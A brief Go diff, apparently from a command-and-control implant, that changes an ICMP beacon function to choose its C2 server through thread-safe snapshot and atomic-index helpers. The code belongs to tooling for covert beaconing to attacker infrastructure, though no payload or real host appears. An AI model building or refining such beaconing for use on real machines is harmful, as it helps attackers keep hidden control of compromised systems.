@@ -19,8 +19,8 @@ func sendICMPBeacon(body []byte) []byte {
 		return nil
 	}
 	host := C2URL
-	if len(C2URLs) > 0 {
-		host = C2URLs[currentC2Idx]
+	if urls := c2URLsSnapshot(); len(urls) > 0 {
+		host = c2URLAtIndex(int(currentC2Idx.Load()))
 	}
 
 	// Resolve server host
